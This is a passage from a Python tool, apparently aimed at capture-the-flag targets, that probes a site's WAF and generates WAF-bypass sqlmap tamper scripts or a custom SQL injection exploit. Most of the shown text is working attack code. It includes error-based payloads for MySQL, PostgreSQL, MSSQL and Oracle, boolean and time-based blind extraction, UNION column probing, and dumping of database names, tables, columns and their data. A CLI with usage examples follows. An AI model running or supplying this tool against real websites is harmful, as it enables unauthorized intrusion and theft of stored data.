            # Cookie/Header 注入: URL 保持原样, payload 在 Cookie/Header 中
            resp = requests.get(url, cookies=_cookies, headers=_headers,
                                proxies=proxies, timeout=TIMEOUT,
                                allow_redirects=False)
        elif METHOD == "GET":
            resp = requests.get(url, cookies=COOKIES, headers=HEADERS,
                                proxies=proxies, timeout=TIMEOUT,
                                allow_redirects=False)
        else:
            # POST: 根据参数构造 body
            body = {{PARAM: encoded}}
            if CONTENT_TYPE == "json":
                resp = requests.post(url, json=body, cookies=COOKIES,
                                      headers=HEADERS, proxies=proxies,
                                      timeout=TIMEOUT, allow_redirects=False)
            else:
                resp = requests.post(url, data=body, cookies=COOKIES,
                                      headers=HEADERS, proxies=proxies,
                                      timeout=TIMEOUT, allow_redirects=False)
        return resp.text
    except requests.exceptions.Timeout:
        return "__TIMEOUT__"
    except Exception as e:
        return f"__ERROR__:{{e}}"


def detect_db_type():
    """运行时检测数据库类型 (通过 version() 或错误信息)"""
    global DB_TYPE
    # 尝试通过 error_inject(version()) 获取版本字符串
    version_result = ""
    if INJ_TYPE.startswith("error"):
        version_result = error_inject("version()")
    elif INJ_TYPE == "union":
        cols = [str(i) for i in range(1, 30)]
        cols[0] = "version()"
        payload = QUOTE + UNION_SEP + SELECT_KW + ",".join(cols[:1]) + COMMENT
        text = send(payload)
        time.sleep(DELAY)
        version_result = text.strip()
    elif INJ_TYPE in ("boolean_blind", "time_blind"):
        # 盲注无法快速获取版本，依赖分析阶段的检测结果
        return DB_TYPE

    vl = version_result.lower()
    if "postgresql" in vl or "postgres" in vl:
        DB_TYPE = "postgresql"
    elif "microsoft" in vl and "sql server" in vl:
        DB_TYPE = "mssql"
    elif "oracle" in vl:
        DB_TYPE = "oracle"
    elif "sqlite" in vl:
        DB_TYPE = "sqlite"
    # MariaDB 归入 MySQL
    elif "mariadb" in vl or "mysql" in vl:
        DB_TYPE = "mysql"
    # 通过错误信息特征判断
    elif "ORA-" in version_result:
        DB_TYPE = "oracle"
    elif "sqlite" in version_result.lower():
        DB_TYPE = "sqlite"

    # 如果仍为默认值, 尝试发送特定函数的 payload 探测
    if DB_TYPE == "mysql" and version_result:
        # 测试 PostgreSQL 特有函数
        pg_test = send(f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}cast(1 as int){{COMMENT}}")
        time.sleep(DELAY)
        if "invalid input syntax" in pg_test or "cannot cast" in pg_test:
            DB_TYPE = "postgresql"

    return DB_TYPE


def get_schema_queries(db_type=None):
    """根据数据库类型返回元数据查询 SQL"""
    d = db_type or DB_TYPE
    schemas = {{
        "mysql": {{
            "tables": "information_schema.tables",
            "columns": "information_schema.columns",
            "table_name_col": "table_name",
            "column_name_col": "column_name",
            "table_schema_col": "table_schema",
            "db_func": "database()",
            "version_func": "version()",
            "concat_func": "group_concat({{expr}})",
            "limit_syntax": True,
        }},
        "postgresql": {{
            "tables": "information_schema.tables",
            "columns": "information_schema.columns",
            "table_name_col": "table_name",
            "column_name_col": "column_name",
            "table_schema_col": "table_schema",
            "db_func": "current_database()",
            "version_func": "version()",
            "concat_func": "string_agg({{expr}}, ',')",
            "limit_syntax": True,
        }},
        "mssql": {{
            "tables": "information_schema.tables",
            "columns": "information_schema.columns",
            "table_name_col": "table_name",
            "column_name_col": "column_name",
            "table_schema_col": "table_schema",
            "db_func": "db_name()",
            "version_func": "@@version",
            "concat_func": "STRING_AGG({{expr}}, ',')",
            "limit_syntax": False,  # MSSQL 用 TOP/OFFSET
        }},
        "oracle": {{
            "tables": "user_tables",
            "columns": "user_tab_columns",
            "table_name_col": "table_name",
            "column_name_col": "column_name",
            "table_schema_col": None,  # Oracle 用 user_tables 不需要 schema 过滤
            "db_func": "sys_context('userenv','current_schema')",
            "version_func": "banner",
            "concat_func": "listagg({{expr}}, ',') within group (order by 1)",
            "limit_syntax": False,  # Oracle 用 ROWNUM
        }},
        "sqlite": {{
            "tables": "sqlite_master",
            "columns": "pragma_table_info(TABLE)",
            "table_name_col": "name",
            "column_name_col": "name",
            "table_schema_col": None,
            "db_func": "'main'",
            "version_func": "sqlite_version()",
            "concat_func": "group_concat({{expr}}, ',')",
            "limit_syntax": True,
        }},
    }}
    return schemas.get(d, schemas["mysql"])


def classify(text):
    """分类响应: blocked / success / wrong / error:DATA / unknown"""
    # WAF 拦截标记
    if WAF_MARK and WAF_MARK in text:
        return "blocked"
    waf_pats = ["逮住", "hacker", "拦截", "非法", "forbidden", "blocked", "waf",
                "403", "501"]
    for pat in waf_pats:
        if pat in text.lower() and len(text) < 2000:
            return "blocked"
    # HTTP 状态码感知 (重定向也视为 blocked)

    # === MySQL/MariaDB 报错回显 ===
    # XPATH 报错回显
    if "XPATH syntax error" in text:
        xpath = re.search(r"XPATH syntax error: '(.*?)'", text)
        if xpath:
            return f"error:{{xpath.group(1)}}"
    # Duplicate entry 报错 (floor 注入)
    m = re.search(r"Duplicate entry '([^']+)'", text)
    if m:
        return f"error:{{m.group(1)}}"
    if "Subquery returns" in text:
        return "multi_row"

    # === PostgreSQL 报错回显 ===
    # cast(/int) 报错: "cannot cast ... to type integer" 或 "invalid input syntax for integer"
    pg_int = re.search(r"invalid input syntax for (?:type )?integer: .(.*?).", text)
    if pg_int:
        return f"error:{{pg_int.group(1)}}"
    pg_int2 = re.search(r"cannot cast type (?:.*?) to integer:\\s+(.*?)", text)
    if pg_int2:
        return f"error:{{pg_int2.group(1)}}"
    # PostgreSQL 12号错误消息: "could not convert ... to type ..."
    pg_err = re.search(r"could not convert .(.*?). to type", text)
    if pg_err:
        return f"error:{{pg_err.group(1)}}"

    # === MSSQL 报错回显 ===
    # convert(int,...) 报错: "Conversion failed when converting the varchar value 'XXX' to data type int"
    mssql_conv = re.search(r"converting the varchar value '(.*?)' to data type int", text, re.IGNORECASE)
    if mssql_conv:
        return f"error:{{mssql_conv.group(1)}}"
    # cast(...as int) 报错: 同上模式

    # === Oracle 报错回显 ===
    # ORA-01790 / ORA-01722 / ORA-00904 / ORA-29257
    ora_err = re.search(r"ORA-\\d+:\\s*(.*?)<", text)
    if ora_err:
        return f"error:{{ora_err.group(1).strip()}}"

    # === SQLite 报错回显 ===
    # "near "...": syntax error" — 语法错误无法提取数据，但可确认 DB 类型
    if "sqlite" in text.lower() and "syntax error" in text.lower():
        return "wrong"  # SQLite 报错不回显数据

    # 成功标记
    if SUCCESS_MARK and SUCCESS_MARK in text:
        return "success"
    # 通用成功标记
    for pat in ["Login Success", "success", "Welcome", "flag"]:
        if pat in text:
            return "success"
    # 失败标记
    for pat in ["Wrong", "fail", "error", "no result"]:
        if pat.lower() in text.lower():
            return "wrong"
    return "unknown"


def error_inject(expr):
    """报错注入: 使用检测到的报错函数，支持多数据库"""
    if DB_TYPE == "mysql":
        # MySQL/MariaDB 报错注入
        if ERROR_FUNC == "updatexml":
            payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}updatexml(1,concat(0x7e,{{expr}}),1){{COMMENT}}"
        elif ERROR_FUNC == "extractvalue":
            payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}extractvalue(1,concat(0x7e,{{expr}})){{COMMENT}}"
        elif ERROR_FUNC == "floor":
            payload = (f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}("
                       f"{{SEL}}count(*)){{FRM}}information_schema.tables)"
                       f"group by concat({{expr}},floor(rand(0)*2)){{COMMENT}}")
        else:
            return "error:unsupported_error_func"
    elif DB_TYPE == "postgresql":
        # PostgreSQL 报错注入: cast(chr(58)||expr as int) 触发类型转换错误
        # chr(58)=':' 作为数据标记, 便于从错误信息中提取
        payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}cast(chr(58)||({{expr}}) as int){{COMMENT}}"
    elif DB_TYPE == "mssql":
        # MSSQL 报错注入: convert(int, expr) 或 cast(expr as int)
        payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}convert(int,({{expr}})){{COMMENT}}"
    elif DB_TYPE == "oracle":
        # Oracle 报错注入: utl_inaddr.get_host_name / ctxsys.drithsx.sn
        payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}utl_inaddr.get_host_name({{expr}}){{COMMENT}}"
    else:
        # SQLite / 未知: 尝试通用 cast 报错
        payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}cast({{expr}} as int){{COMMENT}}"

    text = send(payload)
    time.sleep(DELAY)
    result = classify(text)
    if result.startswith("error:"):
        return result.split(":", 1)[1]
    return result


def is_zero(expr):
    """布尔盲注: BLIND_PREFIX OP (expr) → SUCCESS = expr 为 0"""
    payload = f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}({{expr}}){{COMMENT}}"
    text = send(payload)
    time.sleep(DELAY)
    return "success" in classify(text) or "Login Success" in text


def time_inject(expr, delay_sec=3):
    """时间盲注: if(expr, sleep(delay), 0) → 响应时间 > delay_sec = expr 为真"""
    payload = (f"{{BLIND_PREFIX}}{{QUOTE}}{{LOGICAL_OP}}"
               f"if({{expr}},sleep({{delay_sec}}),0){{COMMENT}}")
    t0 = time.time()
    text = send(payload)
    elapsed = time.time() - t0
    time.sleep(DELAY)
    return elapsed >= delay_sec - 0.5


# ========== 通用数据提取函数 ==========

def build_select_expr(content, table, where_cond=""):
    """构建 SELECT 表达式 (括号闭合)"""
    parts = [SEL, content]
    if SEL_IS_PAREN:
        parts.append(")")
    parts.append(FRM)
    parts.append(table)
    if FRM_IS_PAREN:
        parts.append(")")
    if where_cond:
        parts.append(WHR)
        parts.append(where_cond)
        if WHR_IS_PAREN:
            parts.append(")")
    return "".join(parts)


def extract_char_blind(full_expr, pos):
    """盲注二分查找提取单个字符的 ASCII 值"""
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        # ord(left(full_expr, pos)) > mid ?
        test_expr = f"ord(left(({{full_expr}}),{{pos}}))-{{mid}}"
        if is_zero(f"({{test_expr}})*-1+1"):
            # expr - mid 不为 0，需要判断方向
            # 重新测试: expr > mid ?
            gt_expr = f"if(ord(left(({{full_expr}}),{{pos}}))>{{mid}},1,0)"
            if is_zero(gt_expr):
                # expr <= mid
                high = mid
            else:
                # expr > mid
                low = mid + 1
        else:
            # expr == mid
            return mid
    return low


def extract_string_blind(full_expr, max_len=200):
    """盲注逐字符提取字符串 (二分查找)"""
    result = ""
    # 先获取长度
    for n in range(1, max_len + 1):
        if is_zero(f"length(({{full_expr}}))-{{n}}"):
            total_len = n
            break
    else:
        total_len = max_len

    print(f"  长度: {{total_len}}")
    for pos in range(1, total_len + 1):
        low, high = 32, 127
        while low < high:
            mid = (low + high) // 2
            # ord(left(full_expr, pos)) >= mid+1 ?
            gt_expr = f"if(ord(left(({{full_expr}}),{{pos}}))>={{mid+1}},1,0)"
            if is_zero(gt_expr):
                high = mid
            else:
                low = mid + 1
            time.sleep(DELAY * 0.3)  # 减少请求间隔以加速
        result += chr(low)
        sys.stdout.write(f"\\r  进度: {{result}}")
        sys.stdout.flush()
    print()
    return result


def extract_string_error(full_expr):
    """报错注入提取字符串 (含截断恢复)"""
    result = error_inject(f"({{full_expr}})")
    if not result.startswith("~"):
        return result
    data_val = result.lstrip("~")

    # updatexml/extractvalue 报错约 32 字符截断
    if len(data_val) >= 31:
        len_result = error_inject(f"length(({{full_expr}}))")
        len_str = len_result.lstrip("~") if len_result.startswith("~") else len_result
        try:
            total_len = int(len_str)
        except ValueError:
            total_len = len(data_val)

        if total_len > len(data_val):
            need = total_len - len(data_val) + 5  # +5 重叠区
            rev_result = error_inject(f"reverse(right(({{full_expr}}),{{need}}))")
            rev_val = rev_result.lstrip("~") if rev_result.startswith("~") else ""
            tail = rev_val[::-1]
            overlap = len(data_val) + len(tail) - total_len
            if overlap > 0:
                tail = tail[overlap:]
            data_val = data_val + tail
    return data_val


# ========== 主流程 ==========

print("=" * 70)
print("自动生成 Exploit 执行")
print("=" * 70)

# Step 0: 验证连通性
print("\\n[0] 验证连通性...")
if INJ_TYPE == "union":
    # UNION 注入: 先探测列数和回显位
    print("  正在探测 UNION 列数...")
    COL_COUNT = 0
    for n in range(1, 30):
        # 构造 ORDER BY N 测试
        cols = ",".join(["1"] * n)
        payload = QUOTE + UNION_SEP + SELECT_KW + cols + COMMENT
        text = send(payload)
        time.sleep(DELAY)
        result = classify(text)
        if result == "blocked":
            # WAF 拦截了 payload, 可能 ORDER BY 被过滤
            break
        if "unknown column" in text.lower():
            COL_COUNT = n - 1
            break
        COL_COUNT = n  # 暂存, 可能还能更多

    # 尝试用 UNION SELECT 1,2,...,N 直接确认
    if COL_COUNT == 0:
        # ORDER BY 方法失败, 直接尝试不同列数的 UNION SELECT
        for n in range(1, 30):
            cols_list = [str(i) for i in range(1, n + 1)]
            cols_str = ",".join(cols_list)
            payload = QUOTE + UNION_SEP + SELECT_KW + cols_str + COMMENT
            text = send(payload)
            time.sleep(DELAY)
            result = classify(text)
            if result != "blocked" and "error" not in result:
                # 检查响应中是否包含列序号 (回显位)
                found_echo = False
                for i in range(1, n + 1):
                    if str(i) in text:
                        found_echo = True
                        break
                if found_echo or result == "success":
                    COL_COUNT = n
                    break

    if COL_COUNT == 0:
        print("  [!] UNION 列数探测失败, 回退到报错注入")
        INJ_TYPE = "error_updatexml" if ERROR_FUNC == "updatexml" else "error_extractvalue"
    else:
        print(f"  列数: {{COL_COUNT}}")

        # 确认回显位
        cols_list = [str(i) for i in range(1, COL_COUNT + 1)]
        cols_str = ",".join(cols_list)
        payload = QUOTE + UNION_SEP + SELECT_KW + cols_str + COMMENT
        text = send(payload)
        time.sleep(DELAY)

        ECHO_POS = []
        for i in range(1, COL_COUNT + 1):
            if str(i) in text:
                ECHO_POS.append(i)

        if not ECHO_POS:
            # 没有回显位, 回退到报错注入
            print("  [!] 未找到回显位, 回退到报错注入")
            INJ_TYPE = "error_updatexml" if ERROR_FUNC == "updatexml" else "error_extractvalue"
        else:
            print(f"  回显位: {{ECHO_POS}}")
            ECHO_FIRST = ECHO_POS[0]  # 用第一个回显位替换查询表达式

elif INJ_TYPE.startswith("error"):
    r = error_inject("database()")
    print(f"  database() → {{r}}")
elif INJ_TYPE == "boolean_blind":
    r = is_zero("1-1")  # 0 → SUCCESS
    print(f"  盲注测试 (1-1=0): {{'OK' if r else 'FAIL'}}")
    r2 = is_zero("1-0")  # 1 → WRONG
    print(f"  盲注测试 (1-0=1): {{'OK (WRONG)' if not r2 else 'UNEXPECTED'}}")
elif INJ_TYPE == "time_blind":
    import time as _t
    t0 = _t.time()
    r = time_inject("1=1", delay_sec=3)
    elapsed = _t.time() - t0
    print(f"  时间盲注测试 (1=1): {{'OK' if r else 'FAIL'}} ({{elapsed:.1f}}s)")

# Step 0.5: 检测数据库类型
print("\\n[0.5] 检测数据库类型...")
SCHEMA = get_schema_queries()
detected_db = detect_db_type()
SCHEMA = get_schema_queries()  # 重新获取 (DB_TYPE 可能已更新)
print(f"  数据库类型: {{detected_db}}")
if detected_db != "mysql":
    print(f"  元数据表: {{SCHEMA['tables']}}")
    print(f"  数据库函数: {{SCHEMA['db_func']}}")

# Step 1: 获取数据库名
print("\\n[1] 获取数据库名...")
DB_FUNC = SCHEMA["db_func"]
if INJ_TYPE == "union":
    # UNION 注入: 在回显位替换为数据库函数
    cols = [str(i) for i in range(1, COL_COUNT + 1)]
    cols[ECHO_FIRST - 1] = DB_FUNC
    payload = QUOTE + UNION_SEP + SELECT_KW + ",".join(cols) + COMMENT
    text = send(payload)
    time.sleep(DELAY)
    # 从响应中提取数据库名 (回显位的内容)
    db_name = text.strip()
    print(f"  数据库名: {{db_name}}")
elif INJ_TYPE.startswith("error"):
    db_result = error_inject(DB_FUNC)
    db_name = db_result.lstrip("~") if db_result.startswith("~") else db_result
    print(f"  数据库名: {{db_name}}")
elif INJ_TYPE == "boolean_blind":
    # 直接对 DB_FUNC 做盲注
    db_name = ""
    for n in range(1, 50):
        if is_zero(f"length({{DB_FUNC}})-{{n}}"):
            print(f"  数据库名长度: {{n}}")
            for pos in range(1, n + 1):
                low, high = 32, 127
                while low < high:
                    mid = (low + high) // 2
                    gt_expr = f"if(ord(left({{DB_FUNC}},{{pos}}))>={{mid+1}},1,0)"
                    if is_zero(gt_expr):
                        high = mid
                    else:
                        low = mid + 1
                db_name += chr(low)
                sys.stdout.write(f"\\r  进度: {{db_name}}")
                sys.stdout.flush()
            break
    print(f"\\n  数据库名: {{db_name}}")
elif INJ_TYPE == "time_blind":
    db_name = ""
    for n in range(1, 50):
        if time_inject(f"length({{DB_FUNC}})={{n}}"):
            print(f"  数据库名长度: {{n}}")
            for pos in range(1, n + 1):
                low, high = 32, 127
                while low < high:
                    mid = (low + high) // 2
                    if time_inject(f"ord(left({{DB_FUNC}},{{pos}}))>={{mid+1}}"):
                        low = mid + 1
                    else:
                        high = mid
                db_name += chr(low)
                sys.stdout.write(f"\\r  进度: {{db_name}}")
                sys.stdout.flush()
            break
    print(f"\\n  数据库名: {{db_name}}")

# Step 2: 获取表名
print("\\n[2] 获取表名...")
# 使用 SCHEMA 中的元数据表和列名 (多数据库适配)
_schema_tbl = SCHEMA["tables"]
_tname_col = SCHEMA["table_name_col"]
_schema_col = SCHEMA["table_schema_col"]
_concat_expr = SCHEMA["concat_func"].replace("{{expr}}", _tname_col)

where_cond = f"{{COMPARE_FUNC}}({{DB_FUNC}},{{ _schema_col}})" if COMPARE_FUNC and _schema_col else ""
table_expr = build_select_expr(_concat_expr, _schema_tbl, where_cond)

if INJ_TYPE == "union":
    u_cols = [str(i) for i in range(1, COL_COUNT + 1)]
    u_cols[ECHO_FIRST - 1] = "(" + table_expr + ")"
    payload = QUOTE + UNION_SEP + SELECT_KW + ",".join(u_cols) + COMMENT
    text = send(payload)
    time.sleep(DELAY)
    tables_result = text.strip()
    print(f"  表名: {{tables_result}}")
    tables = [t.strip() for t in tables_result.split(",") if t.strip()]
elif INJ_TYPE.startswith("error"):
    tables_result = extract_string_error(table_expr)
    print(f"  表名: {{tables_result}}")
    tables = [t.strip() for t in tables_result.split(",") if t.strip()]
elif INJ_TYPE in ("boolean_blind", "time_blind"):
    if INJ_TYPE == "boolean_blind":
        tables_result = extract_string_blind(table_expr)
    else:
        # 时间盲注逐字符
        tables_result = ""
        for n in range(1, 200):
            if time_inject(f"length(({{table_expr}}))={{n}}"):
                print(f"  表名总长度: {{n}}")
                for pos in range(1, n + 1):
                    low, high = 32, 127
                    while low < high:
                        mid = (low + high) // 2
                        if time_inject(f"ord(left(({{table_expr}}),{{pos}}))>={{mid+1}}"):
                            low = mid + 1
                        else:
                            high = mid
                    tables_result += chr(low)
                    sys.stdout.write(f"\\r  进度: {{tables_result}}")
                    sys.stdout.flush()
                break
        print(f"\\n  表名: {{tables_result}}")
    tables = [t.strip() for t in tables_result.split(",") if t.strip()]

# Step 3: 获取列名
print("\\n[3] 获取列名...")
table_cols = {{}}  # table -> [col1, col2, ...]
for table in tables:
    if not table:
        continue
    # 使用 hex 编码表名避免特殊字符 (MySQL 语法; 其他数据库可能需要调整)
    table_hex = table.encode().hex()  # 完整 hex (修复截断 bug)
    _cname_col = SCHEMA["column_name_col"]
    _cols_tbl = SCHEMA["columns"]
    _cols_concat = SCHEMA["concat_func"].replace("{{expr}}", _cname_col)
    # SQLite 特殊处理: 使用 pragma_table_info
    if DB_TYPE == "sqlite":
        # SQLite 的列名查询需要特殊处理 (PRAGMA 不在 information_schema 中)
        # 这里仍用 user_tab_columns 等价映射, 手动调整
        col_where = f"{{COMPARE_FUNC}}(0x{{table_hex}},table_name)" if COMPARE_FUNC else ""
        col_expr = build_select_expr(_cols_concat, _cols_tbl, col_where)
    else:
        col_where = f"{{COMPARE_FUNC}}(0x{{table_hex}},table_name)" if COMPARE_FUNC else ""
        col_expr = build_select_expr(_cols_concat, _cols_tbl, col_where)

    if INJ_TYPE == "union":
        u_cols = [str(i) for i in range(1, COL_COUNT + 1)]
        u_cols[ECHO_FIRST - 1] = "(" + col_expr + ")"
        payload = QUOTE + UNION_SEP + SELECT_KW + ",".join(u_cols) + COMMENT
        text = send(payload)
        time.sleep(DELAY)
        cols_result = text.strip()
        cols = [c.strip() for c in cols_result.split(",") if c.strip()]
    elif INJ_TYPE.startswith("error"):
        cols_result = extract_string_error(col_expr)
        cols = [c.strip() for c in cols_result.split(",") if c.strip()]
    elif INJ_TYPE == "boolean_blind":
        cols_str = extract_string_blind(col_expr)
        cols = [c.strip() for c in cols_str.split(",") if c.strip()]
    else:
        # 时间盲注
        cols_str = ""
        for n in range(1, 200):
            if time_inject(f"length(({{col_expr}}))={{n}}"):
                for pos in range(1, n + 1):
                    low, high = 32, 127
                    while low < high:
                        mid = (low + high) // 2
                        if time_inject(f"ord(left(({{col_expr}}),{{pos}}))>={{mid+1}}"):
                            low = mid + 1
                        else:
                            high = mid
                        cols_str += chr(low)
                break
        cols = [c.strip() for c in cols_str.split(",") if c.strip()]

    table_cols[table] = cols
    print(f"  表 {{table}} 列名: {{', '.join(cols)}}")

# Step 4: 获取数据 (flag)
print("\\n[4] 获取数据...")
for table in tables:
    if not table:
        continue
    cols = table_cols.get(table, [])
    for col in cols:
        col = col.strip()
        if not col:
            continue
        data_inner = build_select_expr(SCHEMA["concat_func"].replace("{{expr}}", col), table)

        if INJ_TYPE == "union":
            u_cols = [str(i) for i in range(1, COL_COUNT + 1)]
            u_cols[ECHO_FIRST - 1] = "(" + data_inner + ")"
            payload = QUOTE + UNION_SEP + SELECT_KW + ",".join(u_cols) + COMMENT
            text = send(payload)
            time.sleep(DELAY)
            data_val = text.strip()
            print(f"  表 {{table}} 列 {{col}}: {{data_val}}")
        elif INJ_TYPE.startswith("error"):
            data_val = extract_string_error(data_inner)
            print(f"  表 {{table}} 列 {{col}}: {{data_val}}")
        elif INJ_TYPE == "boolean_blind":
            data_val = extract_string_blind(data_inner)
            print(f"  表 {{table}} 列 {{col}}: {{data_val}}")
        else:
            # 时间盲注
            data_val = ""
            for n in range(1, 500):
                if time_inject(f"length(({{data_inner}}))={{n}}"):
                    print(f"  表 {{table}} 列 {{col}} 长度: {{n}}")
                    for pos in range(1, n + 1):
                        low, high = 32, 127
                        while low < high:
                            mid = (low + high) // 2
                            if time_inject(f"ord(left(({{data_inner}}),{{pos}}))>={{mid+1}}"):
                                low = mid + 1
                            else:
                                high = mid
                            data_val += chr(low)
                        sys.stdout.write(f"\\r  进度: {{data_val}}")
                        sys.stdout.flush()
                    break
            print(f"\\n  表 {{table}} 列 {{col}}: {{data_val}}")

print("\\n" + "=" * 70)
print("Exploit 执行完成")
print("提示: 请根据上面的输出结果, 手动调整 Step 4 的查询目标列")
print("=" * 70)
'''
        return exploit_code


# ============================================================
# CLI 入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="WAF 自动分析器: 探测 WAF 过滤规则, 生成 sqlmap tamper 或自定义 exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 完整分析 + 自动生成
  python waf_analyzer.py -u "http://target/page?id=1" --param id

  # 指定引号和注释符
  python waf_analyzer.py -u "http://target/check.php?username=1&password=1" \\
      --param username --quote "'" --comment "#"

  # 仅分析, 不生成脚本
  python waf_analyzer.py -u "http://target/page?id=1" --param id --analyze-only

  # 手动指定 WAF 拦截标记
  python waf_analyzer.py -u "http://target/page?id=1" --param id \\
      --waf-mark "逮住" --success-mark "Login Success"

  # 从已有分析结果加载 (跳过探测)
  python waf_analyzer.py --load-result result.json --gen-only
        """
    )

    parser.add_argument("-u", "--url", help="目标 URL (含注入参数)")
    parser.add_argument("--param", help="注入参数名")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"],
                        help="HTTP 方法 (默认 GET)")
    parser.add_argument("--quote", default="auto", help="闭合引号 (默认 auto 自动检测)")
    parser.add_argument("--comment", default="auto", help="注释符 (默认 auto 自动检测)")
    parser.add_argument("--content-type", default="form", choices=["form", "json"],
                        help="POST body 编码方式: form (默认) 或 json")
    parser.add_argument("--data", help="POST 数据 (如: username=admin&password=1)")
    parser.add_argument("--cookies", help="Cookie")
    parser.add_argument("--proxy", help="代理 (如: http://127.0.0.1:7890)")
    parser.add_argument("--waf-mark", help="WAF 拦截标记文本 (自动检测则不填)")
    parser.add_argument("--success-mark", help="正常响应标记文本")
    parser.add_argument("--timeout", type=int, default=15, help="请求超时秒数 (默认 15)")
    parser.add_argument("--analyze-only", action="store_true",
                        help="仅分析, 不生成脚本")
    parser.add_argument("--gen-only", action="store_true",
                        help="仅生成脚本 (需配合 --load-result)")
    parser.add_argument("--load-result", help="从 JSON 文件加载分析结果")
    parser.add_argument("--save-result", help="保存分析结果到 JSON 文件")
    parser.add_argument("-o", "--output", default=".",
                        help="输出目录 (默认当前目录)")
    parser.add_argument("-v", "--verbose", action="store_true", default=True,
                        help="详细输出 (默认开启)")

    args = parser.parse_args()

    # 从文件加载分析结果
    if args.load_result:
        with open(args.load_result, 'r') as f:
            data = json.load(f)
        # 重建 analysis 对象 (简化版, 只用于生成)
        analysis = WAFAnalysis.__new__(WAFAnalysis)
        analysis.waf_pattern = data["waf_pattern"]
        analysis.complexity = data["complexity"]
        analysis.results = data["results"]
        analysis.available = data["available"]

        # 从 JSON 恢复连接信息 (如果存在且命令行未指定)
        conn = data.get("connection", {})
        if not args.url and conn.get("url"):
            args.url = conn["url"]
        if not args.param and conn.get("param"):
            args.param = conn["param"]
        if args.quote == "auto" and conn.get("quote"):
            args.quote = conn["quote"]
        if args.comment == "auto" and conn.get("comment"):
            args.comment = conn["comment"]
        if not args.waf_mark and conn.get("waf_mark"):
            args.waf_mark = conn["waf_mark"]
        if not args.success_mark and conn.get("success_mark"):
            args.success_mark = conn["success_mark"]
        if args.method == "GET" and conn.get("method"):
            args.method = conn["method"]

        if not args.gen_only:
            print("[!] --load-result 通常配合 --gen-only 使用")

        # 直接进入生成阶段
        _generate(analysis, args)
        return

    # 正常分析流程
    if not args.url or not args.param:
        parser.error("需要 --url 和 --param 参数")

    print(f"目标: {args.url}")
    print(f"注入参数: {args.param}")
    print(f"闭合引号: {args.quote}")
    print(f"注释符: {args.comment}")

    # 创建探测引擎
    probe = WAFProbe(
        url=args.url,
        param=args.param,
        method=args.method,
        quote=args.quote,
        comment=args.comment,
        data=args.data,
        cookies=args.cookies,
        waf_mark=args.waf_mark,
        success_mark=args.success_mark,
        timeout=args.timeout,
        proxy=args.proxy,
        content_type=args.content_type,
    )

    # auto 检测后, 更新 args 以便后续输出/保存
    args.quote = probe.quote
    args.comment = probe.comment

    # 执行分析
    analysis = WAFAnalysis(probe)
    analysis.run(verbose=args.verbose)

    # 保存结果
    if args.save_result:
        result_path = args.save_result if os.path.isabs(args.save_result) else os.path.join(args.output, args.save_result)
        os.makedirs(os.path.dirname(result_path) or '.', exist_ok=True)
        result_data = analysis.to_dict()
        # 保存连接信息，供 --load-result --gen-only 恢复使用
        result_data["connection"] = {
            "url": args.url,
            "param": args.param,
            "quote": args.quote,
            "comment": args.comment,
            "waf_mark": args.waf_mark,
            "success_mark": args.success_mark,
            "method": args.method,
        }
        with open(result_path, 'w', encoding='utf-8') as f:
            json.dump(result_data, f, indent=2, ensure_ascii=False)
        print(f"\n[+] 分析结果已保存: {result_path}")

    # 生成脚本
    if not args.analyze_only:
        _generate(analysis, args)


def _generate(analysis, args):
    """根据复杂度生成相应脚本"""
    output_dir = args.output

    if analysis.complexity == "simple" or analysis.complexity == "medium":
        # 生成 tamper
        print(f"\n{'=' * 70}")
        print("生成 sqlmap tamper 脚本")
        print(f"{'=' * 70}")

        gen = TamperGenerator(analysis)
        tamper_path = os.path.join(output_dir, "waf_bypass_tamper.py")
        gen.generate(output_path=tamper_path)

        print(f"\n使用方式:")
        print(f"  sqlmap -u \"{args.url}\" --tamper={tamper_path} --batch")
        print(f"\n  # 如需指定注入技术:")
        print(f"  sqlmap -u \"{args.url}\" --tamper={tamper_path} --technique=BEUSTQ --batch")

    if analysis.complexity == "complex":
        # 生成自定义 exploit
        print(f"\n{'=' * 70}")
        print("生成自定义 exploit 脚本 (复杂 WAF, tamper 不可用)")
        print(f"{'=' * 70}")

        gen = ExploitGenerator(
            analysis,
            url=args.url,
            param=args.param,
            quote=args.quote,
            comment=args.comment,
            waf_mark=args.waf_mark,
            success_mark=args.success_mark,
            method=args.method,
            content_type=args.content_type,
        )
        exploit_path = os.path.join(output_dir, "exploit_gen.py")
        gen.generate(output_path="" if not exploit_path else exploit_path)

        print(f"\n使用方式:")
        print(f"  python {exploit_path}")

    # 复杂 WAF 也可以生成 tamper 作为辅助
    if analysis.complexity == "complex" and not args.analyze_only:
        print(f"\n{'=' * 70}")
        print("附加: 生成 sqlmap tamper (辅助, 可能不完全有效)")
        print(f"{'=' * 70}")
        gen = TamperGenerator(analysis)
        tamper_path = os.path.join(output_dir, "waf_bypass_tamper.py")
        gen.generate(output_path=tamper_path)
        print(f"  sqlmap -u \"{args.url}\" --tamper={tamper_path} --batch")


if __name__ == "__main__":
    main()
